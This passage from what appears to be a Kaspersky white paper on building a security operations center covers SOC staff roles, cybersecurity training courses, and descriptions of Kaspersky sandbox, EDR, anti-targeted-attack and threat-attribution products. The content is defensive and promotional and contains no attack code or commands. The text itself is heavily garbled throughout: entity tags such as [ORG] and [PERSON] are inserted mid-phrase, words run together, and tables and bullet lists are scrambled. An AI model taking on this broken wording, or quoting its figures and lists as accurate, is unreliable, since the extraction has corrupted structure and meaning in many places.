specific communities ( e.g. FS - ISAC ) Industry CERTsto detect emerging threats quickly : \u2022 Global anti - malware vendors \u2022 Pure threat intelligence providers\u2022 Threat hunting to proactively search for threats not detected by traditionalsecurity systems like firewall , [ORG] IPS / IDS , [ORG] SIEM , etc.\u2022 Incident investigation and response capability to limit damage and reduceremediation costs.\u2022 Penetration testing & red teaming to quickly identify weak spots whereimprovements are critical . Each of these elements is equally important and warrants separate considerationIntelligence - DrivenSecurity Operations CenterAdvanced ResponsePenetration Testing & Red teamingLog collection ReportingAdaptive Security StrategyFigure 4 : The key elements of the SOCPreventDetectRespondPredict4Knowledge [PERSON] ManagementThe SOC must provide a resource pool of practical knowledge and expertise capable of analyzing a vast amount of data and identifying where further investigation is required . Limited budgets make staffing the [ORG] SOC a challenge . The market is currently experiencing a shortage of well - trained cybersecurity professionals , resulting in increased recruitment and employment costs . An effective SOC team member must have:\u2022 An inquisitive mind , able to construct an integrated overall picture from scattered\u2022 The ability to maintain a continuous focus while withstanding high stress levels ; \u2022 A good general knowledge of IT and cybersecurity , preferably with plenty of practicaldata fragments;experience . Whether you look to fill SOC roles through external recruitment or internal promotion , finding team members with the desired skills \u2018 out of the box \u2019 is not easy . Ongoing training will be needed , not just to fill the gaps between current and required skillsets , but to equip team members to deal with ever - changing security technologies and a continuously evolving threat environment . The table below contains example descriptions of the most common SOC roles and their responsibilities . Relevant roles and staff numbers for your SOC will depend on your service portfolio and scope . In a small SOC , several roles may be held by [CARDINAL] one person , while in a large SOC team , [CARDINAL] more [CARDINAL] than [CARDINAL] one person for each role may be more appropriate . RoleDescriptionDescriptionTier1 AnalystTriage specialistTier2 AnalystIncident handlerCoreIncident registration and assignment\u2022 \u2022 Classification , verification , prioritization of security incidents \u2022 Security sensors health monitoring ( if applicable ) \u2022 Collecting data needed for Tier2 analyst workIncident analysis and [ORG] response\u2022 [ORG] \u2022 Advice on containment and remediation actions \u2022 \u2022 [NORP] Tier1 analyst work periodical reviewIncident response coordination and supportMalware AnalystDigital Forensics AnalystThreat Intelligence AnalystSOC System AdminIncident response to highly sophisticated threats requires reverse engineering on malware samples or / and advanced forensic analysis on artifacts . It \u2019s the primary responsibility of the [PERSON] Malware [PERSON] Analyst to perform malware reverse engineering and produce valuable results for incident response activity . Incident response to highly sophisticated threats requires reverse engineering on malware samples or / and advanced forensic analysis on artifacts . When needed , forensic evidence must be collected and analyzed in a legally sound manner . It \u2019s the primary responsibility of the Digital Forensics Analyst to collect and analyze forensic evidence during incident response activity . When a SOC scales enough , it becomes reasonable to allocate internal threat intelligence functions to a dedicated role . The Threat Intelligence expert is responsible for analyzing threat intelligence from various sources ( analytic reports , [ORG] OSINT , past experience , etc . ) and producing valuable results to the SOC team ( TTPs , IOCs , analytics)The SOC System Administrator is responsible for operation and maintenance ( [ORG] O&M ) of the SOC enclave.\u2022 Static and dynamic in - depth malware analysis \u2022 [ORG] Malware samples reverse - engineering \u2022 Participation in investigation of computer incidents and targetedattacks IOCs acquisition\u2022\u2022 [ORG] Digital evidence collection and analysis \u2022 Participation in investigation of computer incidents and targetedattacks\u2022 OS , application , memory , network forensics analysis \u2022IOCs acquisition\u2022 Open source threat intelligence gathering and analysis \u2022 Vendor threat intelligence analytic reports analysis and parsing \u2022 TTPs and IOCs acquisition from TI - sources \u2022 Threat Data Feeds categorization , prioritization and verification \u2022 [ORG] Threat [ORG] Intelligence analytic reports creation for variousstakeholders\u2022 Produce relevant analytics for SOC team and external partners \u2022 Threat feeds and IOCs sharing with customers\u2022 SOC IT - infrastructure [ORG] O&M \u2022 SOC infrastructure health monitoring \u2022 Scripting & automation \u2022 SOC infrastructure and tools documentation5RoleDescriptionDescriptionSOC [ORG] ManagerThe SOC Manager is responsible for overseeing operations overall and team management.\u2022 People management . \u2022 Strategic management \u2022 [ORG] SOC roadmap and strategy development \u2022 Reporting to higher management , stakeholders , etc . \u2022 SOC performance and [ORG] KPI [ORG] managementTier3 [ORG] Analyst ( Threat Hunter)Vulnerability Assessment ExpertSOC Security EngineerOptional1The Tier3 Analyst is a highly qualified expert who is primarily responsible for proactive threat hunting and high - level detection logic development . S / he may also be involved in incident response activity to address highly sophisticated threats and/or high - priority incidents . Incident analysis and response ( [PERSON] Tier3)\u2022 [PERSON] Threat hunting \u2022 \u2022 Detection logic development and tuning \u2022 Security monitoring system development \u2022 Tier2 Analyst work reviewWhen a [ORG] SOC scales enough , it becomes reasonable to allocate vulnerability assessment functions to a dedicated role . Also , it becomes essential to have an offensive security expert to organize red team exercises , to conduct attack simulations , etc . It \u2019s also very important for TTPs analysis and detection logic development . The [ORG] SOC [ORG] Security engineer is responsible for engineering , integration , and deployment of SOC tools . Depending on the size , composition , and needs of the SOC , you may have a variety of security engineers in your team , who specialize in [GPE] SIEM , endpoint security , and other specific areas of security engineering.\u2022 Vulnerability analysis , prioritizing and reporting \u2022 Penetration testing , red team exercises \u2022 Participation in detection logic testing ( attack simulation)\u2022 [ORG] Create and develop correlation rules , dashboards and reports(if applicable)\u2022 Sensor tuning and maintenances \u2022 Security monitoring system maintenance and development \u2022 Scripting & automation [ORG] \u2022 [ORG] Custom tools developmentLegal [ORG] OfficerThe [ORG] Legal [ORG] Officer is responsible for the SOC \u2019s activities and processes from a compliance perspective.\u2022 Provide advice on specific legal issues regarding [ORG] SOC operations \u2022 Provide legal advice for stakeholders \u2022 Any other legal support for SOC teamKaspersky offers : [ORG] Cybersecurity [ORG] Training [ORG] Services For [DATE] more [DATE] than [DATE] 20 [DATE] years , [ORG] Kaspersky \u2019s cybersecurity expertise \u2013 including threat detection , malware research , reverse engineering and digital forensics \u2013 has been continuously evolving and advancing . Our experts understand how best to handle the threats posed by the [CARDINAL] 325,000 malware samples we encounter [DATE] every [DATE] day , and how to impart that knowledge and hands - on experience to organizations dealing with [DATE] today \u2019s challenging , changeable cybersecurity environment . Our Security Training Program has been designed and developed by the security authorities who helped build [ORG] Kaspersky \u2019s anti - virus labs , and who now inspire and mentor the next generation of global experts . Courses are designed to include both theoretical classes and practical labs . On completion of each course , students are invited to validate their knowledge through an evaluation . Training courses are suitable for IT - related professionals possessing general or advanced system administration and programming skills . All courses are available either in - class on customer premises or at local or regional [PERSON] Kaspersky offices , as applicable . [ORG] DurationSkills gained1 These roles relevance are highly dependent on a SOC \u2019s service portfolio and goals . For example , if the [ORG] SOC is not responsible for threat hunting or vulnerability management , some team roles like \u201c [WORK_OF_ART] Tier [WORK_OF_ART] 3 [WORK_OF_ART] Analyst ( Threat Hunter ) \u201d or \u201c [WORK_OF_ART] Vulnerability [WORK_OF_ART] Assessment [WORK_OF_ART] Expert \u201d may be irrelevant . TopicsWindows Digital ForensicsIntroducing digital forensicsThrough a real - life simulated cyber targeted attack incident , the course covers the following topics : \u2022 \u2022 Live response and evidence acquisition \u2022 Post - mortem analysis of [PRODUCT] Windows machines \u2022 Windows OS registry internals \u2022 Windows OS events \u2022 Windows OS artifacts analysis \u2022 [ORG] Browsers artifacts forensics \u2022 Email analysis \u2022 Forensics challenges with SSD disks \u2022 Recommendations when building a digital forensics lab \u2022 Testing the newly gained skills with a practical challenge using different Windows artifacts5 days\u2022 Acquiring various digital evidence and dealing withit in forensically sound environment\u2022 Find traces of incident - related malicious activitiesfrom the Windows OS artifacts\u2022 Utilizing time stamps from different Windows artifactsto reconstruct an incident scenario\u2022 Finding and analyzing browser and email history \u2022 Be able be apply the tools and instruments of digital\u2022 Understating the process of creating a digitalforensicsforensics lab6TopicsDurationSkills gained5 days5 days5 days5 daysMalware [ORG] Analysis [ORG] & [ORG] Reverse Engineering\u2022 Basic analysis using [ORG] IDA [ORG] Pro [ORG] \u2022 [ORG] Dynamic analysis using popular virtualization solutions and debuggers \u2022 Malicious documents analysis \u2022 Reversing tips and tricksAdvanced Windows Digital ForensicsThrough a real - life simulated targeted cyberattack incident , the course will cover the \u2022 [ORG] FAT file system \u2022 NTFS file system \u2022 Deep Windows forensics \u2022 Data and file recovery from file system , shadow copies and using file carving \u2022 Forensics challenges in Cloud computing \u2022 Timeline vs SuperTimeline analysis \u2022 Testing the newly gained skills with a practical challenge with acquired digitalevidenceAdvanced [ORG] Malware [ORG] Analysis [ORG] & [ORG] Reverse [ORG] Engineering\u2022 [ORG] Unpacking [ORG] \u2022 [ORG] Decryption [ORG] \u2022 [ORG] Developing own decryptors for common scenarios \u2022 [PERSON] Byte code decompilation \u2022 Reconstruction of modern [ORG] APT architectures \u2022 Recognizing typical code constructs \u2022 \u2022 Classification and attribution based on code and data \u2022 Class and structure reconstruction \u2022 [ORG] APT plugin architectures ( based on recent [ORG] APT samples)Identification of cryptographic and compression algorithmsWindows Incident [PERSON] ResponseIn a real - life simulated environment , an incident will take place and the course will cover the following topics on that scenario : \u2022 Introducing the incident response process and its workflow \u2022 Explaining the difference between normal threats and APTs \u2022 Explaining APT Cyber Kill Chain \u2022 Applying the incident response process to different incident scenarios \u2022 Applying Cyber Kill Chain on the simulated environment \u2022 Applying live analysis on victim machines for [ORDINAL] first responders \u2022 Forensically sound evidence - acquisition techniques \u2022 Log file analysis with regular expressions and [ORG] ELK [ORG] \u2022 [ORG] \u2022 [ORG] Creating [ORG] IoCs [ORG] ( Indicators [ORG] of [ORG] Compromise ) , with [ORG] YARA and [ORG] SNORT [ORG] \u2022 Discussing incident analysis reporting and recommendations on building CSIRT \u2022 Testing the newly gained skills with a practical challenge in anotherIntroducing post - mortem analysis and digital forensics Introducing memory forensicsIntroducing malware analysis and sandboxing Introducing network traffic forensicsIntroducing cyber threat intelligencesimulated scenario\u2022 Get preliminary knowledge about OS and assemblylanguage\u2022 Conduct static and dynamic malware analysis obtainingfull understanding of its behavior and functionality\u2022 Deal with malware anti - analysis tricks , self - protective\u2022techniques and protection software bypasses [ORG] Identify and reverse engineer standalone and embedded shellcodes\u2022 Be able to analyze [ORG] PDF exploits from [ORG] scratch\u2022 [ORG] Conducting deep file system analysis \u2022Identifying and recovering deleted files using different techniques\u2022 Analyzing network traffic with different tools \u2022Identifying and tracking malicious activities in memory dump Identifying and dumping interesting parts from memory for further analysis\u2022 Reconstructing the incident timeline using file system\u2022timestamps\u2022 Creating one timeline for all Windows OS artifacts fora better understating of the incident [GPE] scenario\u2022 Be able to analyze a modern [ORG] APT toolkit , from receiving the initial sample , all the way to producing a technical description of the attacker \u2019s TTPs with IOCs\u2022 Producing static decryptors for real - life scenarios and then continuing with in - depth analysis of the malicious code\u2022 Be able to analyze malicious documents that are typically used to deliver initial payloads and know how to extract them\u2022 Ensuring damage assessment and incident responseefforts are accurate and effective\u2022 Understanding the phases of incident response \u2022 What to consider while responding to a cyber incident \u2022 Understanding various attack techniques andtargeted attack anatomy through [FAC] the [FAC] Cyber [FAC] Kill [FAC] Chain\u2022 Responding to different incidents with appropriateactions\u2022 The ability to differentiate APTs from other threats \u2022 Confirming cyber incidents using live analysis tools \u2022 Understanding the difference between live analysis and post - mortem - and when to apply each of them Identifying digital evidence ; HDD , memory and network traffic with an introduction on their forensics analysis\u2022\u2022 [PERSON] Writing [PERSON] YARA and [ORG] SNORT IOCs for the [ORG] detected\u2022 [ORG] Log file analysis \u2022 Understanding the process involved in buildingattackan [ORG] IR [ORG] teamEfficient [ORG] Threat [ORG] Detection with Yara\u2022 Brief intro into [GPE] Yara syntax \u2022 [ORG] Tips [ORG] & tricks to create fast and effective rules \u2022 Yara - generators \u2022 Testing Yara rules for false positives \u2022 Hunting new undetected samples on [ORG] VT [ORG] \u2022 [ORG] Using external modules within [PERSON] Yara for effective hunting \u2022 [NORP] Anomaly search \u2022 Lots ( ! ) of real - life examples \u2022 A set of exercises for improving your [PERSON] Yara skills2 days\u2022 Create effective [PERSON] Yara rules \u2022 Test Yara rules \u2022Improve them to the point where they find threats that nobody else does7Advanced Detection and [ORG] Response TechnologiesToday \u2019s advanced threat protection solutions are oriented towards working with the [ORG] SIEM system , to help organizations build effective new SOCs and to enrich those already in place . This can be achieved in a number of ways . [ORDINAL] First , this can be done by automating , where possible , the detection , analysis and response of manual tasks gives analysts doing alert triage the tools , the time and the head - space they need to apply their analytical skills effectively to things like working with threat data streams . For senior incident response and threat hunting teams , this time can be redirected into proactive threat hunting , the in - depth analysis of incidents and the development plans for an effective response to complex incidents . Other ways are by ensuring that analysts have a full [QUANTITY] 360 [QUANTITY] degree view of the entire infrastructure , and by providing relevant logs to the [ORG] SIEM , as well fast access to consolidated metadata , objects and verdicts . These last also help analysts work effectively even when compromised workstations are inaccessible , or when data has been encrypted by hackers . All this enables the SOC team to better understand the complete sequence of intruder actions , while reducing the number of false positive alerts that analysts must deal with , and the time spent on prioritizing alerts . Kaspersky Offers : [PERSON] Kaspersky [PERSON] Sandbox [PERSON] Kaspersky \u2019s portfolio includes advanced anti - [NORP] APT technologies with the highest detection rates in the industry \u2013 as proven by numerous independent tests . However , to effectively utilize these solutions , companies need to have a fully - fledged IT security department with the appropriate experience and expertise . This is not always the case in companies with geographically distributed infrastructure . These companies usually have a central office with an integrated IT infrastructure containing a large number of workstations , servers , and other auxiliary elements . Regional offices are often heterogeneous , and may include large branches and small regional offices with poor local network and/or Internet access speed . [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack and [PERSON] Kaspersky [PERSON] EDR can be used to protect a central or large regional office . In the hands of experts from [ORG] the [ORG] Security [ORG] Operations [ORG] Center , these tools allow organizations to fully and promptly identify and defeat complex threats . However , medium - size branches and remote offices are not always able to use these solutions , due to a lack of resources and expertise . Budget constraints and the global shortage of specialists trained to deal with complex threats ( making them expensive hires ) , are often the main factors that prevent companies from using these types of solutions in remote offices . In this case , the most accessible and effective approach is to counter complex threats using [ORG] Kaspersky [ORG] Endpoint [ORG] Security [ORG] for [ORG] Business with [PERSON] Kaspersky [PERSON] Sandbox . Central o(cid:31)ceRemote o(cid:31)cesRemote o(cid:31)ce 1Kaspersky Web Tra(cid:31)cSecurityKaspersky Secure MailGatewayKasperskyAnti TargetedAttackKasperskyEndpoint Detectionand ResponseKESBKESBKESB2NRemote o(cid:31)ce 2KESBKESBKESB2N11Remote o(cid:31)ce NKESBKESBKESB12NKESBKESBKESB12NKSCKSCKaspersky Sandbox8Figure [CARDINAL] 5 : [PERSON] Kaspersky [PERSON] Sandbox in a large organization with a distributed networkKaspersky Sandbox helps organizations combat the growing number and complexity of modern threats that can bypass existing endpoint protection . Complementing the functionality of [ORG] Kaspersky [ORG] Endpoint [ORG] Security [ORG] for [ORG] Business , [PERSON] Kaspersky [PERSON] Sandbox allows organizations to significantly increase the level of protection for workstations and servers against previously unknown malware , new viruses and ransomware , zero - [DATE] day exploits , and others \u2013 without the need for highly specialized information security analysts . How it works [PERSON] Kaspersky [PERSON] Sandbox harnesses our expert best practices in combating complex threats and [ORG] APT - level attacks , and is tightly integrated with [ORG] Kaspersky [ORG] Endpoint [ORG] Security [ORG] for [ORG] Business . It \u2019s managed from [ORG] Kaspersky [ORG] Security [ORG] Center , our unified policy - based management console . Workstations /ServersObject reputation request(synchronous mode)Shared cacheof verdictsLoad balancingResponseSuspicious object analysis request(asynchronous mode)Analysis resultHigh - availabilityclusterKaspersky SandboxKESBKESBKESB12NFigure 6 : Kaspersky SandboxKSCCentralized management / updates and health checkDetection data export in [ORG] CEF [ORG] formatInternetSIEMThe [ORG] Kaspersky [ORG] Endpoint [ORG] Security for Business agent requests data about a suspicious object from the shared operational cache of verdicts , located on [PRODUCT] the [PRODUCT] Kaspersky [PRODUCT] Sandbox server . If the object has already been scanned , [ORG] Kaspersky [ORG] Endpoint [ORG] Security [ORG] for [ORG] Business receives the verdict and applies [CARDINAL] one or more remediation options:\u2022 Remove and quarantine ; \u2022 [GPE] Notify user ; \u2022 Start a critical areas scan ; \u2022 Search detected object on other machines within the managed network . If the verdict on an object \u2019s reputation ca n\u2019t be obtained from cache , [ORG] the [ORG] Kaspersky [ORG] Endpoint [ORG] Security [ORG] for Business agent sends the suspicious file to the [PERSON] Sandbox and waits for a response . The [PERSON] Sandbox receives a request to scan the object , at which point the test object is run in an environment isolated from the real infrastructure . File scanning is performed in virtual machines equipped with tools that emulate a typical working environment ( operating systems / installed applications).To detect the malicious intent of an object , behavioral analysis is carried out , artifacts are collected and analyzed , and if the object performs malicious actions , the [PERSON] Sandbox recognizes it as malware . During sandbox analysis , a verdict is assigned to the object . Once the object emulation process is complete , the resulting verdict is sent in real - time to the shared operational cache of verdicts , allowing other hosts with [ORG] Kaspersky [ORG] Endpoint [ORG] Security [ORG] for [ORG] Business installed to quickly obtain data on the reputation of the scanned object without having to analyze the same file again . This approach ensures rapid processing of suspicious objects , reduces the load on [PERSON] Kaspersky [PERSON] Sandbox servers , and improves the speed and efficiency of the response to threats . [PERSON] Kaspersky [PERSON] Sandbox allows organizations to significantly reduce outlay on IT security experts and associated costs by automating most of the tasks relating to advanced threat prevention . It automatically blocks advanced , unknown and complex threats without the need for additional resources , and frees up an organization \u2019s IT security analysts to focus on other tasks.9Kaspersky offers : [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack and [ORG] Kaspersky [ORG] Endpoint [ORG] Detection and ResponseKaspersky Anti Targeted Attack for network traffic analysis and [ORG] Kaspersky [ORG] Endpoint [ORG] Detection and [ORG] Response for endpoint level are based on [CARDINAL] one technological platform comprising a multi - dimensional , all - in - one solution that fully automates time - consuming evidence collection and routine manual tasks related to the processes of detecting threat traces , analyzing and responding to complex incidents . UNIFIED VISIBILITY LAYERAUTOMATION LAYERNetwork tra\u2030c detectionPermanent access to telemetry , collected objects and verdictsInternal event correlationResponseKasperskyAnti Targeted [ORG] Attack [ORG] / EDRDEFENSE LAYER AGAINST COMPLEX THREATS AND RELEVANT LOGS CREATIONAUTOMATEDSEMI(cid:31)AUTOMATEDMANUAL\u2022 Intrusion detection \u2022 URL reputation \u2022 Anti - malware analysis \u2022 Detection with [ORG] YARA rules \u2022 Event matching with [ORG] Threat [ORG] Intelligence [ORG] \u2022 [ORG] Analysis of Android \ufb01les \u2022 Behavior analysis \u2022 Retrospective analysisIoC - based detection : \u2022 Check for loCs on - demand or according to a schedule \u2022 loC scan queries over endpoints \u2022 Centralized loC scanning of \u2022 Kaspersky unique loAs \u2022 Mapping to the MITRE ATT&CK Matrix \u2022 Custom loA database\u2022 Threat hunting framework\u2022 [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] Portal access\u2022 Manual sandbox mode\u2022 External intelligence cooperationFigure [CARDINAL] 7 : Kaspersky Anti Targeted Attack and [PERSON] Kaspersky EDROur technologies serve as an invaluable data source for the [ORG] SIEM , while providing powerful automated detection and threat hunting capabilities . [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack and [PERSON] Kaspersky [PERSON] EDR include the following detection mechanisms : centralized NGAV , [LOC] IoC scanning , [NORP] IoA mapping , [ORG] YARA rules , sandboxing , cloud - based [ORG] ML - APK analysis , behavior analysis , certification checking , retrospective analysis , threat hunting framework , a built - in automated [ORG] Threat [ORG] Intelligence module and [ORG] Threat [ORG] Intelligence [ORG] Portal access . As a result , even sophisticated threats designed to bypass traditional security measures are detected , while your SOC is able to perform [DATE] daily tasks more effectively and efficiently , without wasting time on routine tasks or flipping between multiple consoles . The costs involved in analyzing irrelevant logs are avoided , and the time needed for incident response can be significantly reduced . [PERSON] Employing [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack and [ORG] Kaspersky [ORG] Endpoint [ORG] Detection and [PERSON] Response:\u2022 [PERSON] Notably reduces the number of [TIME] analyst [TIME] hours wasted on tedious but necessary manualtasks around data collection and detection and response [ORG] processes\u2022 [ORG] Contributes significantly to risk mitigation by boosting efficiency in the incidenthandling process\u2022 Enriches the SIEM with new sources of relevant logs for correlation with logs providedby other systems , resulting in better control and effective investigation as well as significantly improved visibility , and minimizing time - to - action\u2022 Provides a wider long - term approach to building the maturity of the SOC.10Product highlights:\u2022 On - premises deployment makes sure no data is exposed outside the organization.\u2022 Supports the analysis of [CARDINAL] more [CARDINAL] thana [CARDINAL] hundred file types.\u2022 Advanced anti - evasion techniques \u2022 [ORG] User activity emulation . \u2022 Custom images allowing to analyze threats across a range of operating systems and applications and only those that apply to real environments\u2022 Separate analysis of each process to detect suspicious activities with associated network connections\u2022 Detailed analysis reports , including allsystem activities , extracted files , network activities ( PCAP ) and visual graphs . \u2022 Data export in STIX , JSON and [ORG] CSV . \u2022 Supports integration with [ORG] KasperskyPrivate [ORG] Security Network.\u2022 Manual file submission and RESTful APIfor seamless integration and automation of your security operations . Kaspersky Offers : Research Sandbox Making an intelligent decision based on a file \u2019s behavior while simultaneously analyzing the process memory , network activity , etc . , is the optimal approach to understanding current sophisticated targeted and tailored threats . Sandboxing technologies are powerful tools that allow investigation of file sample origins , collection of IOCs based on behavioral analysis and detection of malicious objects not previously seen . [DATE] Today \u2019s malware uses a whole variety of methods to avoid executing its code if this could lead to exposing its malicious activity . If the system does not meet the required parameters , the malicious program will almost certainly destroy itself , leaving no traces . For the malicious code to execute , the sandboxing environment must therefore be capable of accurately mimicking normal end - user behavior . [ORG] Kaspersky [ORG] Research [ORG] Sandbox has been developed directly out of our in - lab sandboxing complex , a technology that \u2019s been evolving for [DATE] over [DATE] a [DATE] decade . It incorporates all the knowledge about malware behaviors acquired by [PERSON] Kaspersky throughout our continuous threat research , allowing us to detect [CARDINAL] 350 000 + new malicious objects [DATE] every [DATE] day . Deployed on - premises , this powerful technology also prevents exposure of data outside the organization . The diagram below describes the high - level architecture of [ORG] Kaspersky [ORG] Research [ORG] Sandbox . SECURED PERIMETERWeb [ORG] UIMalware samplesMalware analysisreportsKasperskyPrivate SecurityNetworkFile / URL reputationKasperskySecurity NetworkXXRESTful APIAnalysis of malware inbound and outbound communicationsKaspersky Research SandboxAV updatesAV updatesmirrorKaspersky AV updateserversAnalysis of malware inbound and outbound communicationsFigure [CARDINAL] 8 : Kaspersky Research Sandbox high - level [PERSON] architectureISP1ISP2It offers a hybrid approach , combining threat intelligence gleaned from petabytes of statistical data , behavioral analysis , and rock - solid anti - evasion , with human - simulating technologies . [PERSON] Kaspresky [PERSON] Research [PERSON] Sandbox also allows to customize images of the systems for analysis tailoring them to real environments , which increases the accuracy of threat detection and the speed of investigation . Once that analysis is complete , [PERSON] Research [PERSON] Sandbox provides a detailed report on the behavior and functionality of the analyzed sample , allowing you to define the appropriate response procedures:\u2022 Summary \u2014 general information about a file \u2019s execution results.\u2022 [PERSON] Sandbox detection names \u2014 a list of detects ( both AV and behavioral ) that wereregistered during the file execution.\u2022 Triggered network rules \u2014 a list of network [ORG] SNORT rules that were triggered duringanalysis of traffic from the executed object.\u2022 Execution map \u2014 a graphically represented sequence of object activities ( actions taken on files , processes and the registry , and network activity ) and the relationship between them . The root node of the tree represents the executed object.\u2022 [ORG] Suspicious activities \u2014 a list of registered suspicious [ORG] activities.11\u2022 [ORG] Screenshots \u2014 a set of screenshots that were taken during the file execution.\u2022 [ORG] Loaded [ORG] PE images \u2014 a list of loaded [ORG] PE images that were detected during the fileexecution.\u2022 File operations \u2014 a list of file operations that were registered during the file execution.\u2022 Registry operations \u2014 a list of operations performed on the OS registry that weredetected during the file execution.\u2022 Process operations \u2014 a list of interactions of the file with various processes thatwere registered during the file execution.\u2022 [PERSON] Synchronize operations \u2014 a list of operations of created synchronization objects(mutex , event , semaphore ) that were registered during the file execution.\u2022 Downloaded files \u2014 a list of files that were extracted from network traffic duringthe file execution.\u2022 Dropped files \u2014 a list of files that were saved ( created or modified ) by the executed file.\u2022 HTTPS / HTTP / [ORG] DNS requests \u2014 lists of [ORG] HTTPS / HTTP / [ORG] DNS requests that wereregistered during file execution.\u2022 Network traffic dump ( PCAP ) \u2014 Network activity can be exported in PCAP format . [ORG] Kaspersky [ORG] Research [ORG] Sandbox is the instrument of choice for detecting unknown threats . It \u2019s more mature and more focused on advanced threats than any other solution . Kaspersky Offers : Threat Attribution Engine1 The scale of cyberattacks continues to grow worldwide . Nation - sponsored cyberattacks and targeted attacks have reached a level of intensity never previously witnessed . Professional cybercrime organizations , political \u201c hacktivists \u201d and state - sponsored groups have become more technologically advanced , in many cases outpacing the skills and resources of security teams . However , attackers often reuse code and techniques from previous attacks . Both by recognizing the reused elements from previous attacks and by detecting patterns in the types of modification and reuse observed , we can more rapidly develop defenses , make hypotheses about the source of the malware , and predict and prepare to defend against future attacks . [ORG] Kaspersky [ORG] Threat [ORG] Attribution [ORG] Engine is an unrivaled malware analysis tool for security teams based on the biggest repository of [ORG] APT threats investigated by our [ORG] Global [ORG] Research [ORG] and [ORG] Analysis [ORG] Team . It can quickly link a new attack to known [ORG] APT malware , previous targeted attacks and hacker groups . The tool helps to see the high - risk threat among less serious incidents and take timely protective measures to prevent an attacker from gaining a foothold in the system . Product highlights:\u2022 Provides instant access to a repository of curated data [CARDINAL] about [CARDINAL] hundreds of [ORG] APT actors and samples.\u2022 Allows efficient automated or manualthreat prioritization and alert triage . \u2022 Functionality to add private actorsand objects.\u2022 [GPE] Manual sample upload and open API forintegration with automated workflows.\u2022 Out - of - the - box integration with theKaspersky [GPE] Reserach Sandbox\u2022 ESXi - ready . \u2022 Supports fully on - premises deploymentoption.\u2022 Maintains absolute privacy andconfidentiality of all submissions to avoid exposing sensitive information.1Will be released in Q2 202012How it works [ORG] Kaspersky [ORG] Threat [ORG] Attribution [ORG] Engine analyzes the \u201c genetics \u201d of malware ( i.e. reverse engineered representations of the original file ) looking for code similarity with previously investigated [ORG] APT samples and linked actors in an automated way . It compares the \u201c genes \u201d , i.e. extracted code strings , of file analyzed with the [ORG] APT malware samples database and provides a report on malware origin , threat actors and file similarity with known [NORP] APT samples . Moreover , the product allows security teams to add private actors and objects to its database . The automation of reverse engineering analysis dramatically improves malware analysis and incident response times and allows timely prioritization of threats . New [ORG] APT and clean ( cid:19)les genes ( Updates)Attribution EngineExPetr / NotPetyaDNA ExtractorDNA MatcherSAMPLEFigure [CARDINAL] 9 : Kaspersky Threat Attribution EngineLazarusWannaCryEquationFirst , [ORG] the [ORG] Kaspersky [ORG] Threat [ORG] Attribution [ORG] Engine extracts relevant code strings ( \u201c genes \u201d ) that meet certain criteria . It \u2019s important to note that the final genome database contains [CARDINAL] more [CARDINAL] than [CARDINAL] 10 000 genes . Then it calculates the reputation score out of over 3 billion samples collected over [DATE] more [DATE] than [DATE] 20 [DATE] years of [ORG] Kaspersky research , and shows all bad and good \u201c genotypes \u201d ( group of distinctive genes ) . Finally , it reveals the sample \u2019s genotype and code attribution , providing the customer with insights into the malware \u2019s origin and its possible authors . [PERSON] Kaspersky [PERSON] Attribution [PERSON] Engine improves security operations helping to:\u2022 [PERSON] Rapidly attribute files to known [ORG] APT actors to reveal motivations , methods and toolsbehind cyber incidents;\u2022 Quickly evaluate if you are the target of attack or a side victim to setup propercontainment and response procedures;\u2022 Ensure effective and timely threat mitigation according to actionable threat intelligenceon the [ORG] APT family provided in [ORG] Kaspersky [ORG] APT [ORG] Intelligence Reporting.22A subscription to [ORG] Kaspersky [ORG] APT [ORG] Intelligence [ORG] Reporting needs to be purchased separately13Threat [ORG] IntelligenceSOCs were traditionally built to provide:\u2022 Security device management , perimeter maintenance and preventive securitytechnologies such as [ORG] IPS / IDS , firewalls , proxies etc.;\u2022 Security event monitoring through a Security Information and Event Management(SIEM ) system ; Incident response and remediation ; Internal or regulatory compliance ( e.g. PCI - DSS).\u2022 \u2022Many organizations are now seeking to gain greater threat visibility by establishing their own SOCs . However , some organizations that already have a [ORG] SOC still face many of the same problems as before . There are a number of reasons for this:\u2022 Poor prioritization , meaning that real threats get buried among the [CARDINAL] thousands\u2022of insignificant security alerts received and analyzed [DATE] each [DATE] day ; Incident remediation without a proper understanding of the TTPs ( [ORG] Tactics , Techniques and Procedures ) of associated threat actors , resulting in advanced attacks being overlooked;\u2022 A reactive incident approach , rather than proactively \u2018 hunting out \u2019 threats lyingundiscovered but active within the organization;\u2022 No strategic overview of the existing threat landscape , or awareness of attackson similar enterprises and the countermeasures available;\u2022 Problems attracting adequate internal investment into specific security technologies , due to difficulties communicating the risks to business processes associated with security breaches to non - technical board level executives . Based on these considerations , security leaders are advised to follow an intelligence - driven SOC approach . For the SOC to be effective , it must continuously accommodate new technologies and controls in line with sweeping changes in the threat environment . [PERSON] Proxy serverFirewallNetwork perimeterlogsSIEMFigure [CARDINAL] 10 : A Conventional SOCIPS / IDSGartner defines Threat Intelligence as : \u201c Evidence - based knowledge , including context , mechanisms , indicators , implications and actionable advice about an existing or emerging menace or hazard to assets , that can be used to inform decisions regarding the subject \u2019s response to that menace or hazard . \u201d [PERSON] Gartner , How [ORG] Gartner [ORG] Defines [ORG] Threat Intelligence.14Combining internal threat data with information gathered from external , trusted and reliable sources ( e.g. OSINT or global anti - malware vendors ) provides an understanding of attack techniques and their potential indicators . This is turn allows organizations to develop efficient defensive strategies against commodity and advanced attacks targeting specific organizations . Network perimeterlogsIntelligenceSIEM!Internal threat dataIntelligence from open sources ( OSINT)Industry - speci\ufb01c communities ( e.g. FS - ISAC)Industry [PRODUCT] CERTsPrivate communitiesGlobal anti - malware vendorsPure threat intelligence providersProxy serverFirewallIPS [ORG] / IDSFigure [ORG] 11 : The intelligence - driven [ORG] SOCIncident [ORG] ResponseIntelligence sources should be carefully selected . There \u2019s a direct correlation between the quality of intelligence used and the effectiveness of decisions made on the basis of this intelligence . If you rely on intelligence that \u2019s irrelevant , inaccurate or not aligned with your industry or business goals , or if threat information is not received promptly , the quality of your organization \u2019s decision - making may be seriously compromised . Raw data without context will not provide the relevance needed for SOC teams to be fully effective . For example , knowing that a specific URL is malicious is very different from also knowing that it \u2019s used to host an exploit or a specific type of malware . This additional layer of intelligence tells your security experts what to look out for as they investigate an incident . There are still no common criteria for evaluating various commercial threat intelligence offerings , but 